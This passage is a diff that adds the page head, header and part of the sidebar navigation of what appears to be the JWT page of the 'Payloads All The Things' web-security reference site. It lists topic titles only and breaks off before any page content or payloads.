@@ -1,0 +1,5034 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Payloads All The Things, a list of useful payloads and bypasses for Web Application Security">
+      
+      
+      
+      
+        <link rel="prev" href="../Insecure%20Source%20Code%20Management/">
+      
+      
+        <link rel="next" href="../Java%20RMI/">
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.5.0, mkdocs-material-9.1.19">
+    
+    
+      
+        <title>JWT - JSON Web Token - Payloads All The Things</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.eebd395e.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ecc896b0.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../custom.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#jwt-json-web-token" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Payloads All The Things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              JWT - JSON Web Token
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+          
+            
+            
+            
+            <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+            
+              <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+              </label>
+            
+          
+            
+            
+            
+            <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+            
+              <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+              </label>
+            
+          
+        </form>
+      
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Payloads All The Things
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Payloads All The Things
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CONTRIBUTING/" class="md-nav__link">
+        CONTRIBUTING
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          API Key Leaks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          API Key Leaks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../API%20Key%20Leaks/" class="md-nav__link">
+        API Key Leaks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          AWS Amazon Bucket S3
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          AWS Amazon Bucket S3
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
+        Amazon Bucket S3 AWS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          Account Takeover
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Account Takeover
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Account%20Takeover/" class="md-nav__link">
+        Account Takeover
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+          Argument Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Argument Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Argument%20Injection/" class="md-nav__link">
+        Argument Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+          Business Logic Errors
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Business Logic Errors
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Business%20Logic%20Errors/" class="md-nav__link">
+        Business Logic Errors
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+          CICD
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          CICD
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CICD/" class="md-nav__link">
+        CI/CD attacks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+          CORS Misconfiguration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          CORS Misconfiguration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS%20Misconfiguration/" class="md-nav__link">
+        CORS Misconfiguration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+          CRLF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          CRLF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRLF%20Injection/" class="md-nav__link">
+        Carriage Return Line Feed
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+          CSRF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          CSRF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF%20Injection/" class="md-nav__link">
+        Cross-Site Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+          CSV Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_12">
+          <span class="md-nav__icon md-icon"></span>
+          CSV Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSV%20Injection/" class="md-nav__link">
+        CSV Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
+          CVE Exploits
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_13">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Exploits
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE%20Exploits/" class="md-nav__link">
+        Common Vulnerabilities and Exposures
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE%20Exploits/Log4Shell/" class="md-nav__link">
+        CVE-2021-44228 Log4Shell
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
+          Command Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_14">
+          <span class="md-nav__icon md-icon"></span>
+          Command Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Command%20Injection/" class="md-nav__link">
+        Command Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
+          DNS Rebinding
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_15">
+          <span class="md-nav__icon md-icon"></span>
+          DNS Rebinding
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DNS%20Rebinding/" class="md-nav__link">
+        DNS Rebinding
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
+          Dependency Confusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_16">
+          <span class="md-nav__icon md-icon"></span>
+          Dependency Confusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Dependency%20Confusion/" class="md-nav__link">
+        Dependency Confusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
+          Directory Traversal
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_17">
+          <span class="md-nav__icon md-icon"></span>
+          Directory Traversal
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Directory%20Traversal/" class="md-nav__link">
+        Directory Traversal
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
+          Dom Clobbering
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_18">
+          <span class="md-nav__icon md-icon"></span>
+          Dom Clobbering
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Dom%20Clobbering/" class="md-nav__link">
+        Dom Clobbering
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
+          File Inclusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_19">
+          <span class="md-nav__icon md-icon"></span>
+          File Inclusion
+        </label>
